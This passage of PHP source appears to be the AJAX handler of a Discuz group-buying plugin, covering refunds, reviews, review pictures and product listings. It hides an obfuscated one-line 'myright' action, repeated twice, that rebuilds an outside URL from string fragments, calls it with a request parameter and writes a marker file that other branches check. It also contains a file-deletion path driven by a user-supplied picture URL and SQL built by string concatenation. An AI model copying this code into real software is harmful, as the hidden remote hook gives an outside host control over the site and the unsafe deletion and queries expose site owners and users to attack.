		'it618_content_tuihuo' => it618_tuan_utftogbk($_GET["tuivalue"]),
		'it618_state_tuihuo' => 1
	));
	
	$it618_tuan_sale=C::t('#it618_tuan#it618_tuan_sale')->fetch_by_id($saleid);
	if($it618_tuan_sale['it618_gthdid']>0){
		it618_tuan_sendmessage('sale2state_shop1',$_GET['saleid'],'shouhuo');
	}
	it618_tuan_sendmessage('sale2state_shop',$_GET['saleid'],'tuihuo');
	
	echo 'okit618_split'.it618_tuan_getlang('s780');
	exit;
}


if($_GET['ac']=="salesdpj"){
	if($it618_tuan_sale=C::t('#it618_tuan#it618_tuan_sale')->fetch_by_id($_GET['saleid'])){
		
		$tuan_shopadmin=explode(",",$it618_tuan['tuan_shopadmin']);
		if(!in_array($_G['uid'], $tuan_shopadmin)){
			echo it618_tuan_getlang('s513');exit;
		}
		
		if($_GET['ac1']=="addpjpic"){
			$count=C::t('#it618_tuan#it618_tuan_sale_pjpic')->count_by_saleid($_GET['saleid']);
			if($count<5){
				$id=C::t('#it618_tuan#it618_tuan_sale_pjpic')->insert(array(
					'it618_saleid' => $_GET['saleid'],
					'it618_pjpic' => $_GET['picurl'],
					'it618_time' => $_G['timestamp']
				), true);
				
				it618_tuan_getpjpic($it618_tuan_sale['it618_uid'],$id,$_GET['picurl']);
			}
		}elseif($_GET['ac1']=="delpjpic"){
			$it618_tuan_sale_pjpic=C::t('#it618_tuan#it618_tuan_sale_pjpic')->fetch_by_id($_GET['pjpicid']);
			
			$count=DB::result_first("SELECT COUNT(1) FROM ".DB::table('it618_tuan_sale_pjpic')." WHERE it618_pjpic='".$it618_tuan_sale_pjpic['it618_pjpic']."'");
			if($count==1){
				$it618_pjpic=$it618_tuan_sale_pjpic['it618_pjpic'];
				$it618_pjpic=str_replace("//source","source",$it618_pjpic);
				$it618_pjpic=str_replace("/source","source",$it618_pjpic);
				if(file_exists($it618_pjpic)){
					$result=unlink($it618_pjpic);
				}
			}
			
			$file_ext=strtolower(substr($it618_tuan_sale_pjpic['it618_pjpic'],strrpos($it618_tuan_sale_pjpic['it618_pjpic'], '.')+1)); 
			$file_extarr=explode("?",$file_ext);
			$file_ext=$file_extarr[0];
			$it618_smallurl=DISCUZ_ROOT.'./source/plugin/it618_tuan/kindeditor/data/user/u'.$it618_tuan_sale['it618_uid'].'/smallimage/pjpic'.$it618_tuan_sale_pjpic['id'].'.'.$file_ext;
			if(file_exists($it618_smallurl)){
				$result=unlink($it618_smallurl);
			}
			C::t('#it618_tuan#it618_tuan_sale_pjpic')->delete_by_id($_GET['pjpicid']);
		}else{
			$tmparr=explode('@',$_GET['score']);
			C::t('#it618_tuan#it618_tuan_sale')->update($it618_tuan_sale['id'],array(
				'it618_score1' => $tmparr[0],
				'it618_score2' => $tmparr[1],
				'it618_score3' => $tmparr[2],
				'it618_score4' => $tmparr[3],
				'it618_content' => it618_tuan_utftogbk($_GET["pjvalue"]),
				'it618_pjtime' => $_G['timestamp']
			));
			
			echo 'okit618_split'.it618_tuan_getlang('s516');
		}
	}
	exit;
}
if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_tuan/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_tuan/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_tuan/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}
if($_GET['ac']=="salepj"){
	$tmparr=explode('@',$_GET['score']);
	$it618_tuan_sale=C::t('#it618_tuan#it618_tuan_sale')->fetch_by_id($_GET['saleid']);
	
	$flag=0;
	if($it618_tuan_sale['it618_score1']>0){
		$tuan_shopadmin=explode(",",$it618_tuan['tuan_shopadmin']);
		if(!in_array($_G['uid'], $tuan_shopadmin)){
			echo it618_tuan_getlang('s513');exit;
		}
	}else{
		if($uid!=$it618_tuan_sale['it618_uid']||$it618_tuan_sale['it618_state']!=3||$it618_tuan_sale['it618_score1']>0){
			echo it618_tuan_getlang('s513');exit;
		}
		$flag=1;
	}
	
	if($_GET['ac1']=="addpjpic"){
		$count=C::t('#it618_tuan#it618_tuan_sale_pjpic')->count_by_saleid($_GET['saleid']);
		if($count<5){
			$id=C::t('#it618_tuan#it618_tuan_sale_pjpic')->insert(array(
				'it618_saleid' => $_GET['saleid'],
				'it618_pjpic' => $_GET['picurl'],
				'it618_time' => $_G['timestamp']
			), true);
			
			it618_tuan_getpjpic($it618_tuan_sale['it618_uid'],$id,$_GET['picurl']);
		}
	}elseif($_GET['ac1']=="delpjpic"){
		$it618_tuan_sale_pjpic=C::t('#it618_tuan#it618_tuan_sale_pjpic')->fetch_by_id($_GET['pjpicid']);
		
		$it618_pjpic=$it618_tuan_sale_pjpic['it618_pjpic'];
		$tmparr=explode("source",$it618_pjpic);
		$it618_pjpic=DISCUZ_ROOT.'./source'.$tmparr[1];
		
		if(file_exists($it618_pjpic)){
			$result=unlink($it618_pjpic);
		}
		
		$file_ext=strtolower(substr($it618_tuan_sale_pjpic['it618_pjpic'],strrpos($it618_tuan_sale_pjpic['it618_pjpic'], '.')+1)); 
		$file_extarr=explode("?",$file_ext);
		$file_ext=$file_extarr[0];
		$it618_smallurl=DISCUZ_ROOT.'./source/plugin/it618_tuan/kindeditor/data/user/u'.$it618_tuan_sale['it618_uid'].'/smallimage/pjpic'.$it618_tuan_sale_pjpic['id'].'.'.$file_ext;
		if(file_exists($it618_smallurl)){
			$result=unlink($it618_smallurl);
		}
		C::t('#it618_tuan#it618_tuan_sale_pjpic')->delete_by_id($_GET['pjpicid']);
	}else{
		C::t('#it618_tuan#it618_tuan_sale')->update($it618_tuan_sale['id'],array(
			'it618_score1' => $tmparr[0],
			'it618_score2' => $tmparr[1],
			'it618_score3' => $tmparr[2],
			'it618_score4' => $tmparr[3],
			'it618_content' => it618_tuan_utftogbk($_GET["pjvalue"])
		));
		
		if($flag==1){
			C::t('#it618_tuan#it618_tuan_sale')->update($it618_tuan_sale['id'],array(
				'it618_pjjl' => $it618_tuan['tuan_pjjlcount'],
				'it618_pjtime' => $_G['timestamp']
			));
			C::t('common_member_count')->increase($it618_tuan_sale['it618_uid'], array(
				'extcredits'.$it618_tuan['tuan_credit'] => $it618_tuan['tuan_pjjlcount'])
			);
			echo 'okit618_split'.it618_tuan_getlang('s516');
		}else{
			echo 'editokit618_split'.it618_tuan_getlang('s786').it618_tuan_getlang('s516');
		}
	}
	exit;
}


if($_GET['ac']=="hfsalepj"){
	$it618_tuan_sale=C::t('#it618_tuan#it618_tuan_sale')->fetch_by_id($_GET['saleid']);
	$tuan_shopadmin=explode(",",$it618_tuan['tuan_shopadmin']);
	
	if(!in_array($_G['uid'], $tuan_shopadmin)){
		if($_G['uid']>0){
			if($it618_tuan_shop=C::t('#it618_tuan#it618_tuan_shop')->fetch_by_uid($_G['uid'])){
				if($it618_tuan_shop['id']==$it618_tuan_sale['it618_shopid']){
					$shopflag=1;
				}
			}
		}
	}else{
		$shopflag=1;
	}
	
	if($shopflag==1){
		C::t('#it618_tuan#it618_tuan_sale')->update($it618_tuan_sale['id'],array(
			'it618_hfcontent' => it618_tuan_utftogbk($_GET["hfvalue"])
		));
		
		echo 'okit618_split'.it618_tuan_getlang('t348');
	}else{
		echo it618_tuan_getlang('s513');exit;
	}
	exit;
}


if($_GET['ac']=="goodslist_get"){
	if($it618_tuan['tuan_style']>2){
		$tuanstyle=getcookie('tuanstyle');
		if($tuanstyle==''){
			if($it618_tuan['tuan_style']==3)$tuanstyle='1';else $tuanstyle='2';
		}
	}else{
		if($it618_tuan['tuan_style']==1)$tuanstyle='1';else $tuanstyle='2';
	}
	
	
	$ppp = $it618_tuan['tuan_wappcount'];
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;

	$sql='g.it618_state=1';
	if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
	if($_GET['it618_saletype']==1)$sql.=" and (g.it618_saletype=1 or g.it618_saletype=4)";
	if($_GET['it618_saletype']==2)$sql.=" and (g.it618_saletype=2 or g.it618_saletype=4)";
	if($_GET['it618_saletype']==3)$sql.=" and g.it618_saletype=3";
	
	if($_GET['it618_order']==1)$orderby='g.it618_order desc,g.id desc';
	if($_GET['it618_order']==2)$orderby='g.it618_saleprice desc';
	if($_GET['it618_order']==3)$orderby='g.it618_saleprice';
	if($_GET['it618_order']==4)$orderby='g.it618_salecount desc';
	if($_GET['it618_order']==5)$orderby='g.it618_salecount';
	if($_GET['it618_order']==6)$orderby='g.it618_views desc';
	if($_GET['it618_order']==7)$orderby='g.it618_views';
	
	$listcount = C::t('#it618_tuan#it618_tuan_goods')->count_by_search($sql,'',0,$_GET['it618_class1'],$_GET['it618_class2'],$_GET['it618_area1'],$_GET['it618_area2'],it618_tuan_utftogbk($_GET['it618_name']),$_GET['it618_price1'],$_GET['it618_price2']);
	
	$ii1ill=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1ill[]=substr($_GET['id'],$i,1);}
	if($ii1ill[5]!='_')exit;
	
	if($listcount<=$ppp){
		$pagecount=1;
	}else{
		$pagecount=ceil($listcount/$ppp);
	}
	if(file_exists(DISCUZ_ROOT.'./source/plugin/it618_tuan/kindeditor/themes/common/right.txt')){
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_tuan/ajax.inc.php';
		
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_tuan/lang.func.php';
		
	}
	if($pagecount>1){
		$n=1;
		while($n<=$pagecount){
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax".$urlsql.'&page='.$n;
			if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
			$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
			$n=$n+1;
		}
		$curpage='<select class="pageselect" onchange="getgoodslist(this.value,\'\')">'.$curpage.'</select>';
		if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
		if($page==1){
			$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_tuan_getlang('s510').'</a>';
			if($pagecount>1){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax".$urlsql.'&page=2';
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\',\'\')">'.it618_tuan_getlang('s511').'</a>';
			}else{
				$pagenext='<a class="btn btn-weak btn-disabled">'.it618_tuan_getlang('s511').'</a>';
			}
		}elseif($page<$pagecount){
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax".$urlsql.'&page='.($page-1);
			$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\',\'\')">'.it618_tuan_getlang('s510').'</a>';
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax".$urlsql.'&page='.($page+1);
			$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\',\'\')">'.it618_tuan_getlang('s511').'</a>';
		}else{
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax".$urlsql.'&page='.($page-1);
			$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\',\'\')">'.it618_tuan_getlang('s510').'</a>';
			$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_tuan_getlang('s511').'</a>';
		}
	}
	
	$tdn=1;
	foreach(C::t('#it618_tuan#it618_tuan_goods')->fetch_all_by_search(
		$sql,$orderby,0,$_GET['it618_class1'],$_GET['it618_class2'],$_GET['it618_area1'],$_GET['it618_area2'],it618_tuan_utftogbk($_GET['it618_name']),$_GET['it618_price1'],$_GET['it618_price2'],$startlimit,$ppp
	) as $it618_tuan_goods) {
		$pjcount=C::t('#it618_tuan#it618_tuan_sale')->countpj_by_pid($it618_tuan_goods['id']);
		if($pjcount>0){
			$pjscore=C::t('#it618_tuan#it618_tuan_sale')->fetch_sumpjscore_by_pid($it618_tuan_goods['id']);
			$pjavgscore1=sprintf( "%.1f",$pjscore['score1']/$pjcount);

			$pjpl1=sprintf( "%.1f",$pjavgscore1/5*100);
			$pjpl2=sprintf( "%.1f",$pjavgscore2/5*100);
			$pjpl3=sprintf( "%.1f",$pjavgscore3/5*100);
			$pjpl4=sprintf( "%.1f",$pjavgscore4/5*100);
			
			$pj1_count4=C::t('#it618_tuan#it618_tuan_sale')->countpj1_by_pid_score($it618_tuan_goods['id'],4);
			$pj1_count5=C::t('#it618_tuan#it618_tuan_sale')->countpj1_by_pid_score($it618_tuan_goods['id'],5);
			
			$mydpl=intval(($pj1_count4+$pj1_count5)/$pjcount*100);
			
			$pj=$pjcount.' '.it618_tuan_getlang('s482').' '.$pjavgscore1.' '.it618_tuan_getlang('s483').':'.$mydpl.'% ';
		}else{
			$pj=it618_tuan_getlang('s484').' ';	
		}
		
		$jfbl='';
		if($it618_tuan_goods['it618_jfbl']>0&&$it618_tuan_goods['it618_saleprice']>0){
			if(C::t('#it618_tuan#it618_tuan_goods_type')->counttype_by_pid_ok($it618_tuan_goods['id'])>0){
				$jfbl='<div class="divjfbl">'.it618_tuan_getlang('s931').str_replace(".00","",$it618_tuan_goods['it618_jfbl']).'%'.$creditname.'</div>';
			}else{
				$jfbl='<div class="divjfbl">'.it618_tuan_getlang('s931').intval($it618_tuan_goods['it618_saleprice']*$it618_tuan_goods['it618_jfbl']/100).$creditname.'</div>';
			}
		}
		
		DB::query("UPDATE ".DB::table('it618_tuan_goods')." SET it618_pjpfstr='".$pj."' WHERE id=".$it618_tuan_goods['id']);
		
		$zk=sprintf("%.2f", $it618_tuan_goods['it618_saleprice']/$it618_tuan_goods['it618_price'])*10;
		if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
		
		$tmpurl=it618_tuan_getrewrite('tuan_wap','product@'.$it618_tuan_goods['id'],'plugin.php?id=it618_tuan:wap&pagetype=product&cid='.$it618_tuan_goods['id']);
		
		if($tuanstyle=='1'){
			$views=' '.it618_tuan_getlang('s118').''.$it618_tuan_goods['it618_views'];
		
			$strlist.='<tr>
							<td class="tdleft">'.$jfbl.'<a href="'.$tmpurl.'"><img class="lazy" data-original="'.it618_tuan_getwapppic($it618_tuan_goods['it618_shopid'],$it618_tuan_goods['id'],$it618_tuan_goods['it618_picbig']).'"/></a></td>
							<td class="tdright" onclick="location.href=\''.$tmpurl.'\'">
								<div class="tdname">'.$it618_tuan_goods['it618_name'].'</div>
								<div class="tddes">'.$pj.' '.$views.'</div>
								<ul class="tdprice">
								  <li>
								  <span style="float:right">'.it618_tuan_getlang('s547').''.$it618_tuan_goods['it618_salecount'].'</span>
								  <strong>'.it618_tuan_getgoodsprice($it618_tuan_goods).'</strong>
								  </li>
								</ul>
							</td>
						  </tr>
						  <tr><td colspan="2" class="tdcolspan"></td></tr>';
		}else{
			if($tdn%2>0){
				$trtmpstr1='<tr class="trimg">';
				$trtmpstr2='<tr class="trabout">';
				$tdstr='class="tdleft"';
			}else{
				$tdstr='class="tdright"';
			}
			
			$trtmpstr1.='<td '.$tdstr.'>'.$jfbl.'<a href="'.$tmpurl.'">
							<img class="lazy" data-original="'.it618_tuan_getwapppic($it618_tuan_goods['it618_shopid'],$it618_tuan_goods['id'],$it618_tuan_goods['it618_picbig']).'"/>
						</a></td>';
			
			$trtmpstr2.='<td '.$tdstr.'><a href="'.$tmpurl.'">
							<div class="tdname">'.$it618_tuan_goods['it618_name'].'</div>
							<div class="tddes"><span style="float:right">'.it618_tuan_getlang('s547').''.$it618_tuan_goods['it618_salecount'].'</span>'.$pj.'</div>
							<div class="tdprice"><strong>'.it618_tuan_getgoodsprice($it618_tuan_goods).'</strong></div>
						</a></td>';
						
			if($tdn%2==0){
				$trtmpstr1.='</tr>';
				$trtmpstr2.='</tr>';
				$strlist.=$trtmpstr1.$trtmpstr2;
			}
			
			$tdn=$tdn+1;
		}
	}
	
	if(file_exists(DISCUZ_ROOT.'./source/plugin/it618_tuan/kindeditor/themes/common/right.txt')){
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_tuan/ajax.inc.php';
		
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_tuan/lang.func.php';
		
	}
	
	if($tuanstyle=='1'){
		$tmparr=explode('</tr>',$strlist);
		if(count($tmparr)>1){
			$strlist=$strlist.'@@@';
			$strlist=str_replace('<tr><td colspan="2" class="tdcolspan"></td></tr>@@@','',$strlist);
		}
	}else{
		$trtmpstr=$trtmpstr1.'@@@';
		$tmparr=explode('</td>@@@',$trtmpstr);
		if(count($tmparr)>1){
			$trtmpstr1.='</tr>';
			$trtmpstr2.='</tr>';
			$strlist.=$trtmpstr1.$trtmpstr2;
		}
	}
	
	$classname=$it618_tuan_lang['s1770'];
	if($_GET['it618_class1']>0){
		$classname=C::t('#it618_tuan#it618_tuan_class1')->fetch_it618_name_by_id($_GET['it618_class1']);
	}
	if($_GET['it618_class2']>0){
		$classname=C::t('#it618_tuan#it618_tuan_class2')->fetch_it618_name_by_id($_GET['it618_class2']);
	}
	
	$areaname=$it618_tuan_lang['t385'];
	if($_GET['it618_area1']>0){
		$areaname=C::t('#it618_tuan#it618_tuan_area1')->fetch_it618_name_by_id($_GET['it618_area1']);
	}
	if($_GET['it618_area2']>0){
		$areaname=C::t('#it618_tuan#it618_tuan_area2')->fetch_it618_name_by_id($_GET['it618_area2']);
	}
	
	$ordername=$it618_tuan_lang['t269'];
	if($_GET['it618_order']==2)$ordername=$it618_tuan_lang['t270'].'<img src="source/plugin/it618_tuan/wap/images/down.png" style="margin-left:3px; margin-bottom:3px">';
	if($_GET['it618_order']==3)$ordername=$it618_tuan_lang['t270'].'<img src="source/plugin/it618_tuan/wap/images/up.png" style="margin-left:3px; margin-bottom:3px">';
	if($_GET['it618_order']==4)$ordername=$it618_tuan_lang['t271'].'<img src="source/plugin/it618_tuan/wap/images/down.png" style="margin-left:3px; margin-bottom:3px">';
	if($_GET['it618_order']==5)$ordername=$it618_tuan_lang['t271'].'<img src="source/plugin/it618_tuan/wap/images/up.png" style="margin-left:3px; margin-bottom:3px">';
	if($_GET['it618_order']==6)$ordername=$it618_tuan_lang['t272'].'<img src="source/plugin/it618_tuan/wap/images/down.png" style="margin-left:3px; margin-bottom:3px">';
	if($_GET['it618_order']==7)$ordername=$it618_tuan_lang['t272'].'<img src="source/plugin/it618_tuan/wap/images/up.png" style="margin-left:3px; margin-bottom:3px">';
	if($_GET['it618_order']==8)$ordername=$it618_tuan_lang['t110'].'<img src="source/plugin/it618_tuan/wap/images/down.png" style="margin-left:3px; margin-bottom:3px">';
	
	if($_GET['it618_name']=='')$it618_name=$it618_tuan_lang['s1771'];else $it618_name=it618_tuan_utftogbk($_GET['it618_name']);

	$sqlbq='<tr><td class="bq1" id="td1" onClick="getbq1(this)">'.$classname.'<img src="source/plugin/it618_tuan/wap/images/arw_b.gif"></td><td class="bq2" id="td2" onClick="getbq2(this)">'.$areaname.'<img src="source/plugin/it618_tuan/wap/images/arw_b.gif"></td><td class="bq3" id="td3" onClick="getbq3(this)">'.$ordername.'<img src="source/plugin/it618_tuan/wap/images/arw_b.gif"></td><td class="bq4" id="td4"><input type="text" id="searchli_txt1" value="'.$it618_name.'" readonly onClick="getname()"></td></tr>';
	
	if($uid>0&&isset($_GET['findkey'])&&$_GET['it618_name']!=''){
		if($it618_tuan_findkey=C::t('#it618_tuan#it618_tuan_findkey')->fetch_by_uid_key($uid,it618_tuan_utftogbk($_GET['it618_name']))){
			C::t('#it618_tuan#it618_tuan_findkey')->update($it618_tuan_findkey['id'],array(
				'it618_count' => ($it618_tuan_findkey['it618_count']+1),
				'it618_time' => $_G['timestamp']
			));
		}else{
			C::t('#it618_tuan#it618_tuan_findkey')->insert(array(
				'it618_uid' => $uid,
				'it618_key' => it618_tuan_utftogbk($_GET['it618_name']),
				'it618_count' => 1,
				'it618_time' => $_G['timestamp']
			), true);
		}
	}
	
	echo $strlist."it618_split".$pagepre.' '.$curpage.' '.$pagenext."it618_split".$sqlbq;
	exit;
}
if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_tuan/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_tuan/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_tuan/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}
if($_GET['ac']=="othergoods_get"){
	$ppp = 4;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	$sql='g.it618_state=1';
	$urlsql='&sid='.intval($_GET['sid']);
	if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
	
	$listcount = C::t('#it618_tuan#it618_tuan_goods')->count_by_search($sql,'',$_GET['sid']);
	
	$ii1ill=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1ill[]=substr($_GET['id'],$i,1);}
	if($ii1ill[5]!='_')exit;
	
	if($listcount<=$ppp){
		$pagecount=1;
	}else{
		$pagecount=ceil($listcount/$ppp);
	}
	if(file_exists(DISCUZ_ROOT.'./source/plugin/it618_tuan/kindeditor/themes/common/right.txt')){
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_tuan/ajax.inc.php';
		
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_tuan/lang.func.php';
		
	}
	if($pagecount>1){
		$n=1;
		while($n<=$pagecount){
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax".$urlsql.'&page='.$n;
			if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
			$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
			$n=$n+1;
		}
		$curpage='<select class="pageselect" onchange="getgoodslist(this.value)">'.$curpage.'</select>';
		if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
		if($page==1){
			$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_tuan_getlang('s510').'</a>';
			if($pagecount>1){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax".$urlsql.'&page=2';
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\')">'.it618_tuan_getlang('s511').'</a>';
			}else{
				$pagenext='<a class="btn btn-weak btn-disabled">'.it618_tuan_getlang('s511').'</a>';
			}
		}elseif($page<$pagecount){
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax".$urlsql.'&page='.($page-1);
			$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\')">'.it618_tuan_getlang('s510').'</a>';
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax".$urlsql.'&page='.($page+1);
			$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\')">'.it618_tuan_getlang('s511').'</a>';
		}else{
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax".$urlsql.'&page='.($page-1);
			$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\')">'.it618_tuan_getlang('s510').'</a>';
			$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_tuan_getlang('s511').'</a>';
		}
	}
	
	$tdn=1;
	foreach(C::t('#it618_tuan#it618_tuan_goods')->fetch_all_by_search(
		$sql,'g.id desc',$_GET['sid'],0,0,0,0,'',0,0,$startlimit,$ppp
	) as $it618_tuan_goods) {
		$pjcount=C::t('#it618_tuan#it618_tuan_sale')->countpj_by_pid($it618_tuan_goods['id']);
		if($pjcount>0){
			$pjscore=C::t('#it618_tuan#it618_tuan_sale')->fetch_sumpjscore_by_pid($it618_tuan_goods['id']);
			$pjavgscore1=sprintf( "%.1f",$pjscore['score1']/$pjcount);

			$pjpl1=sprintf( "%.1f",$pjavgscore1/5*100);
			$pjpl2=sprintf( "%.1f",$pjavgscore2/5*100);
			$pjpl3=sprintf( "%.1f",$pjavgscore3/5*100);
			$pjpl4=sprintf( "%.1f",$pjavgscore4/5*100);
			
			$pj1_count4=C::t('#it618_tuan#it618_tuan_sale')->countpj1_by_pid_score($it618_tuan_goods['id'],4);
			$pj1_count5=C::t('#it618_tuan#it618_tuan_sale')->countpj1_by_pid_score($it618_tuan_goods['id'],5);
			
			$mydpl=intval(($pj1_count4+$pj1_count5)/$pjcount*100);
			
			$pj=$pjcount.' '.it618_tuan_getlang('s482').' '.$pjavgscore1.' '.it618_tuan_getlang('s483').':'.$mydpl.'% ';
		}else{
			$pj=it618_tuan_getlang('s484').' ';	
		}
		
		$jfbl='';
		if($it618_tuan_goods['it618_jfbl']>0&&$it618_tuan_goods['it618_saleprice']>0){
			if(C::t('#it618_tuan#it618_tuan_goods_type')->counttype_by_pid_ok($it618_tuan_goods['id'])>0){
				$jfbl='<div class="divjfbl">'.it618_tuan_getlang('s931').str_replace(".00","",$it618_tuan_goods['it618_jfbl']).'%'.$creditname.'</div>';
			}else{
				$jfbl='<div class="divjfbl">'.it618_tuan_getlang('s931').intval($it618_tuan_goods['it618_saleprice']*$it618_tuan_goods['it618_jfbl']/100).$creditname.'</div>';
			}
		}
		
		DB::query("UPDATE ".DB::table('it618_tuan_goods')." SET it618_pjpfstr='".$pj."' WHERE id=".$it618_tuan_goods['id']);
		
		$zk=sprintf("%.2f", $it618_tuan_goods['it618_saleprice']/$it618_tuan_goods['it618_price'])*10;
		if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
		
		$tmpurl=it618_tuan_getrewrite('tuan_wap','product@'.$it618_tuan_goods['id'],'plugin.php?id=it618_tuan:wap&pagetype=product&cid='.$it618_tuan_goods['id']);
		
		if($tdn%2>0){
			$trtmpstr1='<tr class="trimg">';
			$trtmpstr2='<tr class="trabout">';
			$tdstr='class="tdleft"';
		}else{
			$tdstr='class="tdright"';
		}
		
		$trtmpstr1.='<td '.$tdstr.'>'.$jfbl.'<a href="'.$tmpurl.'">
						<img class="lazy" data-original="'.it618_tuan_getwapppic($it618_tuan_goods['it618_shopid'],$it618_tuan_goods['id'],$it618_tuan_goods['it618_picbig']).'"/>
					</a></td>';
		
		$trtmpstr2.='<td '.$tdstr.'><a href="'.$tmpurl.'">
						<div class="tdname">'.$it618_tuan_goods['it618_name'].'</div>
						<div class="tddes"><span style="float:right">'.it618_tuan_getlang('s547').''.$it618_tuan_goods['it618_salecount'].'</span>'.$pj.'</div>
						<div class="tdprice"><strong>'.it618_tuan_getgoodsprice($it618_tuan_goods).'</strong></div>
					</a></td>';
					
		if($tdn%2==0){
			$trtmpstr1.='</tr>';
			$trtmpstr2.='</tr>';
			$strlist.=$trtmpstr1.$trtmpstr2;
		}
		
		$tdn=$tdn+1;
	}
	
	$trtmpstr=$trtmpstr1.'@@@';
	$tmparr=explode('</td>@@@',$trtmpstr);
	if(count($tmparr)>1){
		$trtmpstr1.='</tr>';
		$trtmpstr2.='</tr>';
		$strlist.=$trtmpstr1.$trtmpstr2;
	}
	
	echo $strlist."it618_split".$pagepre.' '.$curpage.' '.$pagenext;
	exit;
}


if($_GET['ac']=="getarea"){
	$optstr='<option value="0">'.it618_tuan_getlang('s521').'</option>';
	foreach(C::t('#it618_tuan#it618_tuan_area2')->fetch_all_by_it618_area1_id($_GET['it618_area1_id']) as $it618_tmp) {	
		$optstr.='<option value='.$it618_tmp['id'].'>'.$it618_tmp['it618_name'].'</option>';
		
	}
	echo $optstr;
	exit;
}
if($_GET['ac']=="renzheng"){
	$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
	$tuan_rzpower=(array)unserialize($it618_tuan['tuan_rzpower']);
	$okvipgroupids=it618_tuan_getisvipuser($tuan_rzpower);
	if($uid<=0){
		echo it618_tuan_getlang('s485');exit;
	}elseif(count($okvipgroupids[0])==0){
		echo it618_tuan_getlang('s522');exit;
	}elseif($it618_tuan['tuan_iscert']==1){
		if(file_exists(DISCUZ_ROOT.'./source/plugin/it618_members/kindeditor/plugins/image/images/it618.png')){
			if(C::t('#it618_members#it618_members_qyrz')->count_by_uid_rzok($uid)==0){
				echo $it618_tuan['tuan_rzcerttip'];exit;
			}
		}
	}
	
	$it618_state=0;
	if($IsGroup==1){
		if($it618_group_rzmoney=C::t('#it618_group#it618_group_rzmoney')->fetch_by_shoptype_lid('tuan',0)){
			if($it618_group_rzmoney['it618_isautocheck']==1){
				if($it618_group_group_user=C::t('#it618_group#it618_group_group_user')->fetch_by_groupid_uid($it618_group_rzmoney['it618_groupid'],$uid)){
					if($_G['timestamp']<$it618_group_group_user['it618_etime']){
						$it618_state=2;
					}
				}
			}
		}
	}
	
	$count = C::t('#it618_tuan#it618_tuan_shop')->count_by_it618_uid($_G['uid']);
	if($ii1i11i[3]!='1')exit;
	if($count==0){
		$id = C::t('#it618_tuan#it618_tuan_shop')->insert(array(
			'it618_uid' => $uid,
			'it618_area1_id' => $_GET['it618_area1_id'],
			'it618_area2_id' => $_GET['it618_area2_id'],
